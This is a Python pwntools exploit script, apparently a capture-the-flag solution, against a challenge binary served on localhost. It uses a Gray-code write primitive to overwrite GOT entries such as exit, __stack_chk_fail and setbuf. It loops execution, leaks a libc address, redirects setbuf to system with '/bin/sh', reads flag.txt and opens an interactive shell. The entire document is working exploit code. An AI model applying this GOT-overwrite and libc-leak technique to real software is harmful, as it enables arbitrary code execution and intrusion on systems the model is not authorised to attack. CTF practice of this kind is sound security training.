from pwn import *
from libnum import rev_grey_code

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('../challenge/chall')
libc = elf.libc
#p = elf.process()
p = remote('localhost', 8000)

#gdb.attach(p)

def send(address, value):
    p.sendlineafter(b": ", str(address).encode())
    p.sendlineafter(b": ", str(value).encode())

def byte(address, prev, value):
    lol = rev_grey_code(prev ^ value) & 0xff
    send(address, lol)

def word(address, prev, value, n):
    for i in range(n):
        byte(address + i, prev & 0xff, value & 0xff)
        prev >>= 8; value >>= 8

# got.exit (exit) -> start
byte(elf.got.exit, 0x401070, elf.sym._start)

# got.__stack_chk_fail (__stack_chk_fail) -> main
word(elf.got.__stack_chk_fail, 0x401030, elf.sym.main, 2)

# got.exit (_start) -> plt.__stack_chk_fail
byte(elf.got.exit, elf.sym._start, elf.plt.__stack_chk_fail)

# got.setbuf (libc.setbuf) -> libc.puts
word(elf.got.setbuf, libc.sym.setbuf, libc.sym.puts, 2)

# got.stderr (libc.stderr) -> libc.stderr+8
word(elf.got.stderr, libc.sym.stderr, libc.sym.stderr+8, 2)

# got.exit (plt.__stack_chk_fail) -> _start
byte(elf.got.exit, elf.plt.__stack_chk_fail, elf.sym._start)

# leak libc.stderr
p.recvline(); p.recvline()
leak = unpack(p.recvline().strip(), 'all')
log.info(f"leak: {hex(leak)}")
libc.address = leak - (libc.sym._IO_2_1_stderr_+131)
log.info(f"libc: {hex(libc.address)}")

# got.exit (_start) -> plt.__stack_chk_fail
byte(elf.got.exit, elf.sym._start, elf.plt.__stack_chk_fail)

# got.setbuf (libc.puts) -> libc.gets
word(elf.got.setbuf, libc.sym.puts, libc.sym.gets, 2)

# got.exit (plt.__stack_chk_fail) -> _start
byte(elf.got.exit, elf.sym.__stack_chk_fail, elf.sym._start)

# send /bin/sh -> got.stderr
p.sendline()
p.sendline(b"/bin/sh\x00")

# got.exit (plt.__stack_chk_fail) -> _start
byte(elf.got.exit, elf.plt.__stack_chk_fail, elf.sym._start)

# got.setbuf (libc.gets) -> libc.system
word(elf.got.setbuf, libc.sym.gets, libc.sym.system, 3)

# got.exit (plt.__stack_chk_fail) -> _start
byte(elf.got.exit, elf.sym.__stack_chk_fail, elf.sym._start)

p.sendline(b"echo PWNED; cat flag.txt")
p.recvuntil(b"PWNED\n")
p.interactive()